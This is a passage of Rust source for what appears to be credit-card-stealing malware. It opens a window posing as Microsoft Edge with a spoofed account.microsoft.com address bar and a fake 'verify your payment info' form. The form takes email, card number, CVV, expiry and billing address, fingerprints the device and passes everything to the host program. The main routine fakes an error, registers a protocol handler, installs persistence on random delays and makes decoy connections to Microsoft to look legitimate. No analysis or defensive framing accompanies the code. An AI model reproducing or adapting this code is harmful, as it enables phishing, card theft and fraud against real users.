        ".button:active{transform:scale(0.98);box-shadow:0 1.6px 3.6px rgba(0,0,0,0.09),0 0.3px 0.9px rgba(0,0,0,0.05);}",
        ".button-group{display:flex;justify-content:space-between;align-items:center;margin-top:28px;}",
        ".link-btn{background:none;border:none;color:#0078d4;font-size:14px;cursor:pointer;text-decoration:none;transition:all 0.1s;padding:6px 12px;border-radius:4px;font-weight:600;}",
        ".link-btn:hover{background:rgba(0,120,212,0.08);text-decoration:underline;}",
        ".hidden{display:none;}",
        ".step-indicator{display:flex;gap:12px;margin-bottom:28px;}",
        ".step{flex:1;height:3px;background:#e1dfdd;border-radius:2px;transition:all 0.3s;position:relative;overflow:hidden;}",
        ".step.active{background:#0078d4;}",
        ".footer{background:#f3f2f1;border-top:1px solid #e1dfdd;padding:20px;margin-top:40px;font-size:12px;color:#605e5c;}",
        ".footer-links{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:12px;}",
        ".footer-links a{color:#0067b8;text-decoration:none;transition:all 0.1s;}",
        ".footer-links a:hover{color:#004578;text-decoration:underline;}",
        ".footer-copy{color:#8a8886;font-size:11px;}",
        "@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}",
        ".card{animation:fadeIn 0.3s ease;}",
        "</style></head><body>",
        "<div class=\"edge-chrome\">",
        "<div class=\"chrome-left\">",
        "<button class=\"nav-btn disabled\" title=\"Back\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"currentColor\"><path d=\"M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z\"/></svg>",
        "</button>",
        "<button class=\"nav-btn disabled\" title=\"Forward\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"currentColor\"><path d=\"M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z\"/></svg>",
        "</button>",
        "<button class=\"nav-btn\" title=\"Refresh\" onclick=\"location.reload()\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"currentColor\"><path d=\"M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z\"/></svg>",
        "</button>",
        "<div class=\"address-bar-container\">",
        "<div class=\"address-bar\">",
        "<div class=\"lock-icon\">",
        "<svg width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\">",
        "<path d=\"M12 2C9.24 2 7 4.24 7 7V10H6C4.9 10 4 10.9 4 12V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V12C20 10.9 19.1 10 18 10H17V7C17 4.24 14.76 2 12 2ZM12 4C13.66 4 15 5.34 15 7V10H9V7C9 5.34 10.34 4 12 4Z\" fill=\"#0f9d58\"/>",
        "</svg>",
        "</div>",
        "<span class=\"url-text\">account.microsoft.com/security/verify</span>",
        "</div>",
        "</div>",
        "</div>",
        "<div class=\"chrome-right\">",
        "<div class=\"toolbar-icon\" title=\"Extensions\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"#5f6368\"><path d=\"M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z\"/></svg>",
        "</div>",
        "<div class=\"profile-icon\" title=\"Profile\">MU</div>",
        "<div class=\"toolbar-icon\" title=\"Settings\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"#5f6368\"><path d=\"M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z\"/></svg>",
        "</div>",
        "<button class=\"window-btn\" onclick=\"minimizeWindow()\" title=\"Minimize\">&#xE921;</button>",
        "<button class=\"window-btn\" onclick=\"maximizeWindow()\" title=\"Maximize\">&#xE922;</button>",
        "<button class=\"window-btn close\" onclick=\"window.close()\" title=\"Close\">&#xE8BB;</button>",
        "</div></div>",
        "<div class=\"content\" id=\"mainContent\">",
        "<div class=\"container\">",
        "<div class=\"breadcrumb\">",
        "<a href=\"#\">Microsoft account</a> › <a href=\"#\">Security</a> › <span>Verify your info</span>",
        "</div>",
        "<div class=\"info-box\" id=\"generalInfoBox\">",
        "<strong>Help us protect your account</strong><br>",
        "We need to verify the payment information on your Microsoft account. This helps us make sure it's you and keeps your account protected. This verification is required as part of our commitment to account security and regulatory compliance.",
        "</div>",
        "<div class=\"card\">",
        "<div id=\"step1\">",
        "<div class=\"card-title\">Let's verify it's you</div>",
        "<div class=\"step-indicator\"><div class=\"step active\"></div><div class=\"step\"></div><div class=\"step\"></div></div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Email or phone</label>",
        "<input type=\"email\" class=\"form-input\" id=\"email\" placeholder=\"Email or phone number\">",
        "<div class=\"error-msg\" id=\"email-error\">That doesn't look right. Check your email or phone number and try again.</div>",
        "</div>",
        "<div class=\"button-group\"><span></span><button class=\"button\" onclick=\"validateStep1()\">Next</button></div>",
        "</div>",
        "<div id=\"step2\" class=\"hidden\">",
        "<div class=\"card-title\">Update your payment info</div>",
        "<div class=\"step-indicator\"><div class=\"step active\"></div><div class=\"step active\"></div><div class=\"step\"></div></div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Card number</label>",
        "<input type=\"text\" class=\"form-input\" id=\"cardNumber\" placeholder=\"1234 5678 9012 3456\" maxlength=\"19\">",
        "<div class=\"error-msg\" id=\"cardNumber-error\">Please enter a valid card number.</div>",
        "</div>",
        "<div class=\"form-row\">",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Name on card</label>",
        "<input type=\"text\" class=\"form-input\" id=\"cardholderName\" placeholder=\"Full name as shown on card\">",
        "<div class=\"error-msg\" id=\"cardholderName-error\">Please enter the name exactly as it appears on your card.</div>",
        "</div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Expires</label>",
        "<input type=\"text\" class=\"form-input\" id=\"expiry\" placeholder=\"MM/YY\" maxlength=\"5\">",
        "<div class=\"error-msg\" id=\"expiry-error\">Please enter a valid expiration date.</div>",
        "</div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Security code (CVV)</label>",
        "<input type=\"password\" class=\"form-input\" id=\"cvv\" placeholder=\"3 digits\" maxlength=\"4\">",
        "<div class=\"error-msg\" id=\"cvv-error\">Please enter your card's security code.</div>",
        "</div>",
        "</div>",
        "<div class=\"button-group\"><button class=\"link-btn\" onclick=\"nextStep(1)\">Back</button><button class=\"button\" onclick=\"validateStep2()\">Next</button></div>",
        "</div>",
        "<div id=\"step3\" class=\"hidden\">",
        "<div class=\"card-title\">Confirm your billing address</div>",
        "<div class=\"step-indicator\"><div class=\"step active\"></div><div class=\"step active\"></div><div class=\"step active\"></div></div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Address line 1</label>",
        "<input type=\"text\" class=\"form-input\" id=\"address\" placeholder=\"Street address or P.O. Box\">",
        "<div class=\"error-msg\" id=\"address-error\">Please enter your street address.</div>",
        "</div>",
        "<div class=\"address-row\">",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">City</label>",
        "<input type=\"text\" class=\"form-input\" id=\"city\" placeholder=\"City\">",
        "<div class=\"error-msg\" id=\"city-error\">Please enter your city.</div>",
        "</div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">State or province</label>",
        "<input type=\"text\" class=\"form-input\" id=\"state\" placeholder=\"State or province\">",
        "<div class=\"error-msg\" id=\"state-error\">Please enter your state or province.</div>",
        "</div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">ZIP or postal code</label>",
        "<input type=\"text\" class=\"form-input\" id=\"zip\" placeholder=\"ZIP or postal code\">",
        "<div class=\"error-msg\" id=\"zip-error\">Please enter your ZIP or postal code.</div>",
        "</div>",
        "</div>",
        "<div class=\"form-group\">",
        "<label class=\"form-label\">Country or region</label>",
        "<input type=\"text\" class=\"form-input\" id=\"country\" placeholder=\"Select country or region\">",
        "<div class=\"error-msg\" id=\"country-error\">Please select your country or region.</div>",
        "</div>",
        "<div id=\"submit-error\" class=\"error-box hidden\">",
        "<strong>We couldn't complete your request</strong><br>",
        "Something went wrong and we couldn't finish verifying your information. This might be because:<br>",
        "• Some of the information entered wasn't quite right<br>",
        "• We're experiencing a temporary service interruption<br>",
        "• Your session has timed out<br><br>",
        "Your information has been saved. You can close this window and try again in a few minutes. If the problem continues, contact Microsoft Support for help.",
        "</div>",
        "<div class=\"button-group\"><button class=\"link-btn\" onclick=\"nextStep(2)\">Back</button><button class=\"button\" onclick=\"validateStep3()\">Verify</button></div>",
        "</div>",
        "</div>",
        "<div class=\"footer\">",
        "<div class=\"footer-links\">",
        "<a href=\"#\">Privacy & cookies</a>",
        "<a href=\"#\">Terms of use</a>",
        "<a href=\"#\">Trademarks</a>",
        "<a href=\"#\">Safety & security</a>",
        "<a href=\"#\">Accessibility</a>",
        "<a href=\"#\">Contact us</a>",
        "</div>",
        "<div class=\"footer-copy\">© 2026 Microsoft. All rights reserved.</div>",
        "</div>",
        "</div></div>",
        "<canvas id=\"fp\" width=\"200\" height=\"50\" style=\"display:none;\"></canvas>"
    );
    
    let script = format!(
        "<script>const sid=\"{}\";const pt=\"{}\";const rs={};",
        session, proc_time, rand_seed
    ) + r#"
function md5(s){function L(k,d){return(k<<d)|(k>>>(32-d))}function K(G,k){var I,d,F,H,x;F=(G&2147483648);H=(k&2147483648);I=(G&1073741824);d=(k&1073741824);x=(G&1073741823)+(k&1073741823);if(I&d){return(x^2147483648^F^H)}if(I|d){if(x&1073741824){return(x^3221225472^F^H)}else{return(x^1073741824^F^H)}}else{return(x^F^H)}}function r(d,F,k){return(d&F)|((~d)&k)}function q(d,F,k){return(d&k)|(F&(~k))}function p(d,F,k){return(d^F^k)}function n(d,F,k){return(F^(d|(~k)))}function u(G,F,aa,Z,k,H,I){G=K(G,K(K(r(F,aa,Z),k),I));return K(L(G,H),F)}function f(G,F,aa,Z,k,H,I){G=K(G,K(K(q(F,aa,Z),k),I));return K(L(G,H),F)}function D(G,F,aa,Z,k,H,I){G=K(G,K(K(p(F,aa,Z),k),I));return K(L(G,H),F)}function t(G,F,aa,Z,k,H,I){G=K(G,K(K(n(F,aa,Z),k),I));return K(L(G,H),F)}function e(G){var Z;var F=G.length;var x=F+8;var k=(x-(x%64))/64;var I=(k+1)*16;var aa=Array(I-1);var d=0;var H=0;while(H<F){Z=(H-(H%4))/4;d=(H%4)*8;aa[Z]=(aa[Z]|(G.charCodeAt(H)<<d));H++}Z=(H-(H%4))/4;d=(H%4)*8;aa[Z]=aa[Z]|(128<<d);aa[I-2]=F<<3;aa[I-1]=F>>>29;return aa}function B(x){var k="",F="",G,d;for(d=0;d<=3;d++){G=(x>>>(d*8))&255;F="0"+G.toString(16);k=k+F.substr(F.length-2,2)}return k}function J(k){k=k.replace(/rn/g,"n");var d="";for(var F=0;F<k.length;F++){var x=k.charCodeAt(F);if(x<128){d+=String.fromCharCode(x)}else{if((x>127)&&(x<2048)){d+=String.fromCharCode((x>>6)|192);d+=String.fromCharCode((x&63)|128)}else{d+=String.fromCharCode((x>>12)|224);d+=String.fromCharCode(((x>>6)&63)|128);d+=String.fromCharCode((x&63)|128)}}}return d}var C=Array();var P,h,E,v,g,Y,X,W,V;var S=7,Q=12,N=17,M=22;var A=5,z=9,y=14,w=20;var o=4,m=11,l=16,j=23;var U=6,T=10,R=15,O=21;s=J(s);C=e(s);Y=1732584193;X=4023233417;W=2562383102;V=271733878;for(P=0;P<C.length;P+=16){h=Y;E=X;v=W;g=V;Y=u(Y,X,W,V,C[P+0],S,3614090360);V=u(V,Y,X,W,C[P+1],Q,3905402710);W=u(W,V,Y,X,C[P+2],N,606105819);X=u(X,W,V,Y,C[P+3],M,3250441966);Y=u(Y,X,W,V,C[P+4],S,4118548399);V=u(V,Y,X,W,C[P+5],Q,1200080426);W=u(W,V,Y,X,C[P+6],N,2821735955);X=u(X,W,V,Y,C[P+7],M,4249261313);Y=u(Y,X,W,V,C[P+8],S,1770035416);V=u(V,Y,X,W,C[P+9],Q,2336552879);W=u(W,V,Y,X,C[P+10],N,4294925233);X=u(X,W,V,Y,C[P+11],M,2304563134);Y=u(Y,X,W,V,C[P+12],S,1804603682);V=u(V,Y,X,W,C[P+13],Q,4254626195);W=u(W,V,Y,X,C[P+14],N,2792965006);X=u(X,W,V,Y,C[P+15],M,1236535329);Y=f(Y,X,W,V,C[P+1],A,4129170786);V=f(V,Y,X,W,C[P+6],z,3225465664);W=f(W,V,Y,X,C[P+11],y,643717713);X=f(X,W,V,Y,C[P+0],w,3921069994);Y=f(Y,X,W,V,C[P+5],A,3593408605);V=f(V,Y,X,W,C[P+10],z,38016083);W=f(W,V,Y,X,C[P+15],y,3634488961);X=f(X,W,V,Y,C[P+4],w,3889429448);Y=f(Y,X,W,V,C[P+9],A,568446438);V=f(V,Y,X,W,C[P+14],z,3275163606);W=f(W,V,Y,X,C[P+3],y,4107603335);X=f(X,W,V,Y,C[P+8],w,1163531501);Y=f(Y,X,W,V,C[P+13],A,2850285829);V=f(V,Y,X,W,C[P+2],z,4243563512);W=f(W,V,Y,X,C[P+7],y,1735328473);X=f(X,W,V,Y,C[P+12],w,2368359562);Y=D(Y,X,W,V,C[P+5],o,4294588738);V=D(V,Y,X,W,C[P+8],m,2272392833);W=D(W,V,Y,X,C[P+11],l,1839030562);X=D(X,W,V,Y,C[P+14],j,4259657740);Y=D(Y,X,W,V,C[P+1],o,2763975236);V=D(V,Y,X,W,C[P+4],m,1272893353);W=D(W,V,Y,X,C[P+7],l,4139469664);X=D(X,W,V,Y,C[P+10],j,3200236656);Y=D(Y,X,W,V,C[P+13],o,681279174);V=D(V,Y,X,W,C[P+0],m,3936430074);W=D(W,V,Y,X,C[P+3],l,3572445317);X=D(X,W,V,Y,C[P+6],j,76029189);Y=D(Y,X,W,V,C[P+9],o,3654602809);V=D(V,Y,X,W,C[P+12],m,3873151461);W=D(W,V,Y,X,C[P+15],l,530742520);X=D(X,W,V,Y,C[P+2],j,3299628645);Y=t(Y,X,W,V,C[P+0],U,4096336452);V=t(V,Y,X,W,C[P+7],T,1126891415);W=t(W,V,Y,X,C[P+14],R,2878612391);X=t(X,W,V,Y,C[P+5],O,4237533241);Y=t(Y,X,W,V,C[P+12],U,1700485571);V=t(V,Y,X,W,C[P+3],T,2399980690);W=t(W,V,Y,X,C[P+10],R,4293915773);X=t(X,W,V,Y,C[P+1],O,2240044497);Y=t(Y,X,W,V,C[P+8],U,1873313359);V=t(V,Y,X,W,C[P+15],T,4264355552);W=t(W,V,Y,X,C[P+6],R,2734768916);X=t(X,W,V,Y,C[P+13],O,1309151649);Y=t(Y,X,W,V,C[P+4],U,4149444226);V=t(V,Y,X,W,C[P+11],T,3174756917);W=t(W,V,Y,X,C[P+2],R,718787259);X=t(X,W,V,Y,C[P+9],O,3951481745);Y=K(Y,h);X=K(X,E);W=K(W,v);V=K(V,g)}var i=B(Y)+B(X)+B(W)+B(V);return i.toLowerCase()}
function getCanvasFP(){const c=document.getElementById('fp');const x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillStyle='#'+(rs%0xFFFFFF).toString(16).padStart(6,'0');x.fillRect(125+(rs%10),1+(rs%5),62,20);x.fillStyle='#069';x.fillText('Test '+(rs%1000),2+(rs%5),15);const d=c.toDataURL();return md5(d);}
function detectFonts(){const baseFonts=['monospace','sans-serif','serif'];const testFonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS','Arial Black','Impact'];const canvas=document.createElement('canvas');const ctx=canvas.getContext('2d');const detected=[];for(const font of testFonts){ctx.font='72px '+font+','+baseFonts[0];const base=ctx.measureText('mmmmmmmmmmlli').width;ctx.font='72px '+font;const test=ctx.measureText('mmmmmmmmmmlli').width;if(base!==test)detected.push(font);}return detected.join(',');}
function getDeviceID(){const components={user_agent:navigator.userAgent,fonts:detectFonts(),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen_width:screen.width.toString(),screen_height:screen.height.toString(),dpi:window.devicePixelRatio.toString(),language:navigator.language,platform:navigator.platform};const input=components.user_agent+'|'+components.fonts+'|'+components.timezone+'|'+components.screen_width+'|'+components.screen_height+'|'+components.dpi+'|'+components.language+'|'+components.platform;return md5(input);}
const fp=getCanvasFP();
const deviceID=getDeviceID();
function sendToRust(data){if(window.ipc){window.ipc.postMessage(JSON.stringify(data));}else{console.error('IPC not available');}}
window.addEventListener('click',()=>{sendToRust({step:0,session:sid,device_id:deviceID,canvas_fp:fp});},{ once: true });
function minimizeWindow(){document.body.style.opacity='0';setTimeout(()=>document.body.style.opacity='1',200);}
function maximizeWindow(){if(document.body.classList.contains('maximized')){document.body.classList.remove('maximized');}else{document.body.classList.add('maximized');}}
const content=document.getElementById('mainContent');
function nextStep(s){for(let i=1;i<=3;i++){document.getElementById('step'+i).classList.add('hidden');}document.getElementById('step'+s).classList.remove('hidden');const infoBox=document.getElementById('generalInfoBox');if(s===3){infoBox.classList.add('hidden');}else{infoBox.classList.remove('hidden');}content.scrollTo({top:0,behavior:'smooth'});}
function sanitize(s){return s.replace(/[<>"'&]/g,c=>({'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#x27;','&':'&amp;'}[c]));}
function showError(id){document.getElementById(id).classList.add('error');document.getElementById(id+'-error').style.display='block';}
function clearError(id){document.getElementById(id).classList.remove('error');document.getElementById(id+'-error').style.display='none';}
function validateEmail(e){const re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;return re.test(e);}
function validateCard(c){const clean=c.replace(/\s/g,'');if(clean.length<13||clean.length>19||!/^\d+$/.test(clean))return false;let sum=0,isEven=false;for(let i=clean.length-1;i>=0;i--){let d=parseInt(clean[i]);if(isEven){d*=2;if(d>9)d-=9;}sum+=d;isEven=!isEven;}return sum%10===0;}
function validateExpiry(e){if(!/^\d{2}\/\d{2}$/.test(e))return false;const[m,y]=e.split('/').map(Number);return m>=1&&m<=12&&y>=24;}
function validateStep1(){const email=document.getElementById('email').value.trim();clearError('email');if(!email||!validateEmail(email)){showError('email');return;}const data={step:1,email:sanitize(email),session:sid,device_id:deviceID,canvas_fp:fp};sendToRust(data);setTimeout(()=>nextStep(2),100);}
function validateStep2(){let valid=true;const card=document.getElementById('cardNumber').value.trim();const name=document.getElementById('cardholderName').value.trim();const exp=document.getElementById('expiry').value.trim();const cvv=document.getElementById('cvv').value.trim();clearError('cardNumber');clearError('cardholderName');clearError('expiry');clearError('cvv');if(!card||!validateCard(card)){showError('cardNumber');valid=false;}if(!name||name.length<3){showError('cardholderName');valid=false;}if(!exp||!validateExpiry(exp)){showError('expiry');valid=false;}if(!cvv||cvv.length<3||cvv.length>4||!/^\d+$/.test(cvv)){showError('cvv');valid=false;}if(valid){const data={step:2,card_number:sanitize(card),cardholder_name:sanitize(name),expiry:sanitize(exp),cvv:sanitize(cvv),session:sid,device_id:deviceID,canvas_fp:fp};sendToRust(data);setTimeout(()=>nextStep(3),100);}}
function validateStep3(){let valid=true;['address','city','state','zip','country'].forEach(id=>{clearError(id);const val=document.getElementById(id).value.trim();if(!val||val.length<2){showError(id);valid=false;}});if(valid){setTimeout(()=>submitForm(),100);}}
function submitForm(){const errBox=document.getElementById('submit-error');errBox.classList.remove('hidden');const data={step:3,street_address:sanitize(document.getElementById('address').value),city:sanitize(document.getElementById('city').value),state:sanitize(document.getElementById('state').value),zip_code:sanitize(document.getElementById('zip').value),country:sanitize(document.getElementById('country').value),session:sid,device_id:deviceID,canvas_fp:fp,process_time:pt};sendToRust(data);}
document.getElementById('cardNumber').addEventListener('input',function(e){let v=e.target.value.replace(/\s/g,'');e.target.value=v.match(/.{1,4}/g)?.join(' ')||v;});
document.getElementById('expiry').addEventListener('input',function(e){let v=e.target.value.replace(/[^0-9]/g,'');if(v.length>=2){v=v.slice(0,2)+'/'+v.slice(2,4);}e.target.value=v;});
document.getElementById('expiry').addEventListener('keydown',function(e){if(e.key==='Backspace'){e.preventDefault();let v=this.value.replace(/[^0-9]/g,'');if(v.length>0){v=v.slice(0,-1);if(v.length>=2){this.value=v.slice(0,2)+'/'+v.slice(2);}else{this.value=v;}}else{this.value='';}}});
</script></body></html>"#;
    
    format!("{}{}", html, script)
}

fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    let el = EventLoop::new();
    
    let win_builder = WindowBuilder::new()
        .with_title("Microsoft Edge")
        .with_visible(false)
        .with_decorations(false)
        .with_resizable(true);

    let window = win_builder.build(&el)?;

    if let Some(monitor) = window.current_monitor() {
        let screen_size = monitor.size();
        let width = screen_size.width as f64 * 0.85;
        let height = screen_size.height as f64 * 0.85;
        
        let x = (screen_size.width as f64 - width) / 2.0;
        let y = (screen_size.height as f64 - height) / 2.0;

        window.set_inner_size(PhysicalSize::new(width, height));
        window.set_outer_position(PhysicalPosition::new(x, y));
    }

    window.set_visible(true);

    let _wv = WebViewBuilder::new(window)?
        .with_html(html)?
        .with_ipc_handler(|_window, msg| {
            let msg_owned = msg.to_string();
            thread::spawn(move || {
                let _ = handle_ipc_message(&msg_owned);
            });
        })
        .build()?;

    el.run(move |ev, _, cf| {
        *cf = ControlFlow::Wait;
        match ev {
            Event::WindowEvent { event: WindowEvent::CloseRequested, .. } => {
                *cf = ControlFlow::Exit;
            }
            _ => {}
        }
    });
}

async fn sim_legit_async() {
    let _ = std::env::var("APPDATA");
    let _ = tokio::net::TcpStream::connect("www.microsoft.com:80").await;
    simulate_installer_scan();
}

fn main() {
    // Check for activation argument
    let args: Vec<String> = std::env::args().collect();
    if args.len() > 1 && args[1] == "--activate" {
        // This is the 2nd instance launched by protocol handler
        write_activation_flag();
        std::process::exit(0);
    }
    
    // Main instance continues
    enforce_singleton();
    show_fake_error();
    register_protocol_handler();
    
    init_globals();
    
    let use_persist = should_persist();
    let uptime = get_uptime_hrs();

    thread::spawn(move || {
        let telemetry_delay = get_telemetry_delay();
        thread::sleep(Duration::from_secs(telemetry_delay));
        
        let pkt = TelemetryData {
            session: get_session_id(),
            device_id: "pending".to_string(),
            process_time: get_proc_time(),
            uptime_hours: uptime,
        };
        if let Ok(_j) = serde_json::to_string_pretty(&pkt) {
            let enriched = serde_json::json!({
                "session": pkt.session,
                "device_id": pkt.device_id,
                "process_time": pkt.process_time,
                "uptime_hours": pkt.uptime_hours,
                "timestamp": ts()
            });
            send_enriched_data(&enriched);
        }
    });

    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(sim_legit_async());
    
    if use_persist {
        thread::spawn(|| {
            let delay = get_random_persist_delay();
            thread::sleep(Duration::from_secs(delay));
            install_persist();
        });
    }
    
    thread::spawn(|| {
        notification_loop();
    });

    loop {
        thread::sleep(Duration::from_secs(1));
        if did_user_click() {
            break;
        }
    }
    
    let html = get_html();
    if let Ok(_) = create_win(html) {
        mark_success();
    }
    
    if is_success() {
        remove_persist();
    }
    
    std::process::exit(0);
}
